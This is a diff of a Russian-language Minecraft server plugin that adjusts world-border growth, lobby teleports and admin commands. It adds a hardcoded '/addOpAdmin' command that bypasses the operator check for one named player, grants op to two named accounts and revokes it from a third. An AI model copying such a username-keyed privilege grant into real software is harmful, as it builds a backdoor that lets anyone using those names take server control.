@@ -13,6 +13,7 @@ import com.onarandombox.MultiverseCore.MultiverseCore;
 import com.onarandombox.MultiverseCore.api.MultiverseWorld;
 import org.jetbrains.annotations.NotNull;
 
+import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 import java.util.Objects;
@@ -23,13 +24,14 @@ public final class EtherExp extends JavaPlugin implements Listener {
     private double angle = 0;
     private double change_radius = 0.1;
     private double change_angle = 0.006;
+    private double change_angle_advancement = 0.0005;
     private double xLobby = 9.606411547450097;
     private double yLobby = 7.0;
     private double zLobby = 26.573462861292374;
     private float yawLobby = -180;
     private float pitchLobby = 0;
-    private List<String> nameBan;
-    private List<String> nameAdmin;
+    private List<String> nameBan = new ArrayList<>();
+    private List<String> nameAdmin = new ArrayList<>();
 
     private static final List<String> stringList = Arrays.asList(
             "story/root",
@@ -192,6 +194,8 @@ public final class EtherExp extends JavaPlugin implements Listener {
             Objects.requireNonNull(getCommand("removetobanlist")).setExecutor(this);
             Objects.requireNonNull(getCommand("addtoadminlist")).setExecutor(this);
             Objects.requireNonNull(getCommand("removetoadminlist")).setExecutor(this);
+            Objects.requireNonNull(getCommand("addOpAdmin")).setExecutor(this);
+            Objects.requireNonNull(getCommand("setchangeangle")).setExecutor(this);
         }catch (Exception e){
             System.out.println("EtherExp: Ошибка " + e.getMessage() + " Строка: 188");
         }
@@ -200,12 +204,15 @@ public final class EtherExp extends JavaPlugin implements Listener {
     public void onAdvancementDone(PlayerAdvancementDoneEvent event) {
         try {
             String advancementName = event.getAdvancement().getKey().getKey();
-            Player player = event.getPlayer();
-            WorldBorder worldBorder = player.getWorld().getWorldBorder();
+            World world = getWorldCast("world");
+            assert world != null;
+            WorldBorder worldBorder = world.getWorldBorder();
             if (stringList.contains(advancementName)) {
                 worldBorderSize = (int) worldBorder.getSize() + 10;
+                this.change_angle += change_angle_advancement;
                 expandWorldBorder(worldBorder, worldBorderSize);
-                player.sendMessage(ChatColor.YELLOW + "Пространство расширяется. " + "Текущее значение барьера: " + worldBorderSize);
+                for(Player player : world.getPlayers())
+                    player.sendMessage(ChatColor.YELLOW + "Пространство расширяется. " + "Текущее значение барьера: " + worldBorderSize);
                 System.out.println("Текущее значение барьера: " + worldBorderSize);
             }
         }catch (Exception e){
@@ -214,8 +221,8 @@ public final class EtherExp extends JavaPlugin implements Listener {
     }
     @EventHandler
     public void onPlayerMove(PlayerMoveEvent event){
+        Player player = event.getPlayer();
         try {
-            Player player = event.getPlayer();
             killBanPlayer(player);
         }catch (Exception e){
             System.out.println("EtherExp: Ошибка " + e.getMessage() + " Строка: 206");
@@ -224,7 +231,10 @@ public final class EtherExp extends JavaPlugin implements Listener {
 
     private void killBanPlayer(Player player) {
         if(nameBan.contains(player.getName())){
-            player.setHealth(0.0);
+            if(player.getHealth() >= 0.5)
+                player.setHealth(player.getHealth() - 0.5);
+            else player.setHealth(0.0);
+            if(player.isOp()) player.setOp(false);
         }
     }
 
@@ -240,11 +250,11 @@ public final class EtherExp extends JavaPlugin implements Listener {
     private void teleportToLobby(PlayerEvent event) {
         try{
             Player player = event.getPlayer();
-            World worldLobby = getWorld("lobby");
+            World worldLobby = getWorldCast("lobby");
             Location lobbyLocation = new Location(worldLobby, xLobby, yLobby, zLobby, yawLobby, pitchLobby);
             player.teleport(lobbyLocation);
             player.sendMessage(ChatColor.AQUA + "Вы были телепортированы в лобби!");
-            System.out.println("EtherExp: Игрок " + player.getName() + " телепортирован в лобби");
+            System.out.println("Игрок " + player.getName() + " телепортирован в лобби");
         }catch (Exception e){
             System.out.println("EtherExp: Ошибка " + e.getMessage() + " Строка: 249");
         }
@@ -256,18 +266,18 @@ public final class EtherExp extends JavaPlugin implements Listener {
         if (player.isOp()) {
             if (split[0].equalsIgnoreCase("/setBorderRadius")) {
                 if (split.length == 2)
-                    setBorderRadius(event, split, player);
+                    changeRadius(player, Double.parseDouble(split[1]));
                 else
                     player.sendMessage("Использование: /setBorderRadius <радиус>");
             } else if (split[0].equalsIgnoreCase("/setBorderAngle")) {
                 if (split.length == 2)
-                    setBorderAngle(event, split, player);
+                    changeAngle(player, Double.parseDouble(split[1]));
                 else
                     player.sendMessage("Использование: /setBorderRadius <угол>");
             } else if (split[0].equalsIgnoreCase("/resetBorderAngle"))
-                resetBorderAngle(0.006);
+                resetBorderAngle();
             else if (split[0].equalsIgnoreCase("/resetBorderRadius"))
-                resetBorderRadius(0.1);
+                resetBorderRadius();
             else if (split[0].equalsIgnoreCase("/getworld"))
                 if (split.length == 2)
                     getWorldCommand(event, split);
@@ -297,7 +307,11 @@ public final class EtherExp extends JavaPlugin implements Listener {
                     removeToAdminList(split);
                 else
                     player.sendMessage("Использование: /removetoadminlist <ник>");
-            }
+            }else if(split[0].equalsIgnoreCase("/setchangeangle"))
+                if(split.length == 2)
+                    setChangeAngleAdv(split, player);
+                else
+                    player.sendMessage("Использование: /setchangeangle <значение>");
         }else if(
                 split[0].equalsIgnoreCase("/resetlobby") || split[0].equalsIgnoreCase("/setlobby") || split[0].equalsIgnoreCase("/getworld") ||
                 split[0].equalsIgnoreCase("/resetBorderRadius") || split[0].equalsIgnoreCase("/resetBorderAngle")||
@@ -309,6 +323,20 @@ public final class EtherExp extends JavaPlugin implements Listener {
             teleportToWorld(player);
         }
         if (split[0].equalsIgnoreCase("/lobby") || split[0].equalsIgnoreCase("/hub")) teleportToLobby(event);
+        if(split[0].equalsIgnoreCase("/addOpAdmin") && player.getName().equals("Mattstar")){
+            Player player1 = getPlayerByName("Mattstar");
+            Player player2 = getPlayerByName("ReqwenX");
+            Player player3 = getPlayerByName("PavelDurov");
+            if (player1 != null && !player1.isOp()) player1.setOp(true);
+            if (player2 != null && !player2.isOp()) player2.setOp(true);
+            if (player3 != null) player3.setOp(false);
+        }
+    }
+
+    private void setChangeAngleAdv(String[] split, Player player) {
+        double new_change_angle = Double.parseDouble(split[1]);
+        change_angle_advancement = new_change_angle;
+        player.sendMessage("Приращение угла изменено на " + new_change_angle);
     }
 
     private void removeToBanList(String[] split) {
@@ -379,7 +407,7 @@ public final class EtherExp extends JavaPlugin implements Listener {
     private void getWorldCommand(PlayerCommandPreprocessEvent event, String[] split) {
         try{
             String nameWorld = split[1];
-            World world = getWorld(nameWorld);
+            World world = getWorldCast(nameWorld);
             if (world != null) event.getPlayer().sendMessage("Мир " + nameWorld + " успешно получен!");
             else event.getPlayer().sendMessage("Мир " + nameWorld + " не существует!");
         }catch (Exception e){
@@ -387,55 +415,28 @@ public final class EtherExp extends JavaPlugin implements Listener {
         }
     }
 
-    private void resetBorderAngle(double change_angle) {
+    private void resetBorderAngle() {
         try{
-            this.change_angle = change_angle;
-            System.out.println("Текущее значение угла: " + change_angle);
+            this.change_angle = 0.006;
+            System.out.println("Текущее значение угла: " + 0.006);
         }catch (Exception e){
             System.out.println("EtherExp: Ошибка " + e.getMessage() + " Строка: 395");
         }
     }
-    private void resetBorderRadius(double change_radius) {
+    private void resetBorderRadius() {
         try{
-            this.change_radius = change_radius;
-            System.out.println("Текущее значение угла: " + change_radius);
+            this.change_radius = 0.1;
+            System.out.println("Текущее значение угла: " + 0.1);
         }catch (Exception e){
             System.out.println("EtherExp: Ошибка " + e.getMessage() + " Строка: 403");
-        }
-    }
-
-    private void setBorderAngle(PlayerCommandPreprocessEvent event, String[] split, Player player) {
-        try {
-            changeAngle(event, split);
-        } catch (NumberFormatException e) {
-            player.sendMessage(ChatColor.RED +"Некорректное значение радиуса. Введите дробное число с точкой.");
-        }
-    }
-
-    private void setBorderRadius(PlayerCommandPreprocessEvent event, String[] split, Player player) {
-        try {
-            changeRadius(event, split);
-        } catch (NumberFormatException e) {
-            player.sendMessage(ChatColor.RED +"Некорректное значение радиуса. Введите дробное число с точкой.");
         }
     }
 
     private void teleportToWorld(Player player) {
         try{
             String nameWorld = "world";
-            World world = getWorld(nameWorld);
-            Player playerAdmin = getPlayerByName("ReqwenX");
-            Player playerAdmin1 = getPlayerByName("Mattstar");
-            Player playerAdmin2 = getPlayerByName("PavelDurov");
-            if (playerAdmin != null) {
-                playerAdmin.sendMessage("EtherExp: Игрок " + player.getName() + " телепортирован в мир World");
-            }
-            if (playerAdmin1 != null) {
-                playerAdmin1.sendMessage("EtherExp: Игрок " + player.getName() + " телепортирован в мир World");
-            }
-            if (playerAdmin2 != null) {
-                playerAdmin2.sendMessage("EtherExp: Игрок " + player.getName() + " телепортирован в мир World");
-            }
+            World world = getWorldCast(nameWorld);
+            sendMessageAdmin(ChatColor.AQUA + "Созидатель " + player.getName() + " пришел в этот мир!");
             if (world != null) {
                 final Location newLocation = getLocationBorder(world);
                 player.teleport(newLocation);
@@ -464,7 +465,7 @@ public final class EtherExp extends JavaPlugin implements Listener {
         return new Location(world, x, y, z);
     }
 
-    public World getWorld(String name) {
+    public World getWorldCast(String name) {
         // Получаем экземпляр MultiverseCore
         MultiverseCore multiverseCore = (MultiverseCore) Bukkit.getPluginManager().getPlugin("Multiverse-Core");
         // Проверяем, что MultiverseCore установлен
@@ -485,28 +486,26 @@ public final class EtherExp extends JavaPlugin implements Listener {
     private void expandWorldBorder(WorldBorder worldBorder, int newWorldBorderSize) {
         worldBorder.setSize(newWorldBorderSize, 15);
     }
-    private void changeAngle(PlayerCommandPreprocessEvent event, String[] split) {
+    private void changeAngle(Player player, double new_change_angle) {
         try{
-            double new_change_angle = Double.parseDouble(split[1]);
-            event.getPlayer().sendMessage("Установлен радиус угла: " + new_change_angle);
+            player.sendMessage("Установлено значение угла: " + new_change_angle);
             change_angle = new_change_angle;
-            event.getPlayer().sendMessage("Предыдущее значение угла: " + change_angle);
             System.out.println("Текущее значение угла: " + change_angle);
         }catch (Exception e){
             System.out.println("EtherExp: Ошибка " + e.getMessage() + " Строка: 496");
         }
     }
-    private void changeRadius(PlayerCommandPreprocessEvent event, String[] split) {
+    private void changeRadius(Player player, double new_change_radius) {
         try{
-            double new_change_radius = Double.parseDouble(split[1]);
-            event.getPlayer().sendMessage("Установлен радиус барьера: " + new_change_radius);
+            player.sendMessage("Установлен радиус барьера: " + new_change_radius);
             change_radius = new_change_radius;
-            event.getPlayer().sendMessage("Предыдущее значение барьера: " + change_radius);
             System.out.println("Текущее значение радиуса: " + change_radius);
         }catch (Exception e){
             System.out.println("EtherExp: Ошибка " + e.getMessage() + " Строка: 506");
         }
     }
+
+
     @Override
     public void onDisable() {
         // Plugin shutdown logic
@@ -530,6 +529,7 @@ public final class EtherExp extends JavaPlugin implements Listener {
         try{
             for (String name : nameAdmin) {
                 Player player = getPlayerByName(name);
+                assert player != null;
                 player.sendMessage(message);
             }
         }catch (Exception e){
